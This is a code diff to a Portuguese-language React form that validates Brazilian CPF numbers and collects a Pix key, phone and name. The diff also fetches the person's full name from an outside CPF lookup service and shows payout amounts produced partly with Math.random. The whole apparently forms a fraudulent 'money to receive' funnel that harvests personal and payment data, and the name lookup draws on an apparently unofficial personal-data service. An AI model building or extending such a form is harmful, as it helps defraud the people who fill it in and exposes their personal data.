@@ -98,6 +98,20 @@ function digitsToDisplay(digits) {
     return `R$ ${num.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
 }
 
+function isValidCPF(digits) {
+    if (digits.length !== 11 || /^(\d)\1+$/.test(digits)) return false;
+    let sum = 0;
+    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
+    let r = (sum * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    if (r !== parseInt(digits[9])) return false;
+    sum = 0;
+    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
+    r = (sum * 10) % 11;
+    if (r === 10 || r === 11) r = 0;
+    return r === parseInt(digits[10]);
+}
+
 function toTitleCase(str) {
     const small = ["da", "de", "do", "das", "dos", "e", "e"];
     return str.toLowerCase().split(" ").map((w, i) =>
@@ -118,7 +132,7 @@ function generateAmounts(rawDigits) {
     const a1 = round50(total * (0.55 + Math.random() * 0.1));
     const a2 = total - a1;
 
-    const fmt = (n) => n.toLocaleString("pt-BR", { minimumFractionDigits: 0, maximumFractionDigits: 0 });
+    const fmt = (n) => n.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     return { a1: fmt(a1), a2: fmt(a2), total: fmt(total) };
 }
 
@@ -202,6 +216,11 @@ function StepForm({ onSubmit, onClose }) {
         if (cpfDigits.length !== 11) {
             setCpfData(null);
             setCpfStatus("idle");
+            return;
+        }
+        if (!isValidCPF(cpfDigits)) {
+            setCpfData(null);
+            setCpfStatus("invalid");
             return;
         }
         setCpfStatus("loading");
@@ -313,13 +332,20 @@ function StepForm({ onSubmit, onClose }) {
                             className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                             style={{
                                 ...inputStyle,
-                                borderColor: cpfStatus === "found" ? "rgba(0,255,102,0.5)" : "#1e3a26",
+                                borderColor: cpfStatus === "found"   ? "rgba(0,255,102,0.5)"
+                                           : cpfStatus === "invalid" ? "rgba(239,68,68,0.6)"
+                                           : "#1e3a26",
                             }}
                         />
                         {cpfStatus === "loading" && (
                             <p className="mt-1.5 text-[11px] text-zinc-500 flex items-center gap-1.5">
                                 <span className="w-2 h-2 rounded-full bg-zinc-500 animate-pulse inline-block" />
                                 Verificando CPF...
+                            </p>
+                        )}
+                        {cpfStatus === "invalid" && (
+                            <p className="mt-1.5 text-[11px] text-red-400 flex items-center gap-1.5">
+                                ✕ CPF inválido — verifique e tente novamente
                             </p>
                         )}
                         {cpfStatus === "found" && (
@@ -587,10 +613,34 @@ function StepPixKey({ formData, onSubmit, onBack }) {
     const [nome, setNome]         = useState(
         formData?.cpfData?.NOME ? toTitleCase(formData.cpfData.NOME) : ""
     );
+    const [nomeStatus, setNomeStatus] = useState(
+        formData?.cpfData?.NOME ? "found" : "loading"
+    );
     const [telefone, setTelefone] = useState("");
     const [keyType, setKeyType]   = useState("CPF");
     const [keyValue, setKeyValue] = useState(formData?.cpf || "");
     const [error, setError]       = useState("");
+
+    // Busca o nome pelo CPF ao abrir o step (fallback caso o form tenha submetido antes da API responder)
+    useEffect(() => {
+        if (formData?.cpfData?.NOME) { setNomeStatus("found"); return; }
+        const digits = (formData?.cpf || "").replace(/\D/g, "");
+        if (digits.length !== 11) { setNomeStatus("idle"); return; }
+        setNomeStatus("loading");
+        fetch(`https://cpf.pixdecria.shop/api/v1/consult/${digits}`, {
+            headers: { "Accept": "application/json" },
+        })
+            .then((r) => r.json())
+            .then((data) => {
+                if (data?.NOME) {
+                    setNome(toTitleCase(data.NOME));
+                    setNomeStatus("found");
+                } else {
+                    setNomeStatus("idle");
+                }
+            })
+            .catch(() => setNomeStatus("idle"));
+    }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
     const selectedType = PIX_KEY_TYPES.find((k) => k.value === keyType);
     const showPhone = keyType !== "telefone";
@@ -639,7 +689,13 @@ function StepPixKey({ formData, onSubmit, onBack }) {
                     <div>
                         <div className="flex items-center justify-between mb-1.5">
                             <label className="block text-[10px] font-bold tracking-[0.18em] text-zinc-400 uppercase">Nome completo</label>
-                            {formData?.cpfData?.NOME && (
+                            {nomeStatus === "loading" && (
+                                <span className="text-[9px] text-zinc-500 flex items-center gap-1">
+                                    <span className="w-1.5 h-1.5 rounded-full bg-zinc-500 animate-pulse inline-block" />
+                                    Buscando...
+                                </span>
+                            )}
+                            {nomeStatus === "found" && (
                                 <span className="text-[9px] font-semibold text-[#00FF66] bg-[#00FF66]/10 border border-[#00FF66]/25 px-1.5 py-0.5 rounded-full">
                                     ✓ Preenchido automaticamente
                                 </span>
@@ -649,12 +705,12 @@ function StepPixKey({ formData, onSubmit, onBack }) {
                             type="text"
                             value={nome}
                             onChange={(e) => setNome(e.target.value)}
-                            placeholder="Seu nome completo"
+                            placeholder={nomeStatus === "loading" ? "Buscando seu nome..." : "Seu nome completo"}
                             required
                             className="w-full rounded-xl px-4 py-3 text-white placeholder-zinc-600 text-sm focus:outline-none focus:ring-1 focus:ring-[#00FF66]/50"
                             style={{
                                 ...inputStyle,
-                                borderColor: formData?.cpfData?.NOME ? "rgba(0,255,102,0.35)" : "#1e3a26",
+                                borderColor: nomeStatus === "found" ? "rgba(0,255,102,0.35)" : "#1e3a26",
                             }}
                         />
                     </div>
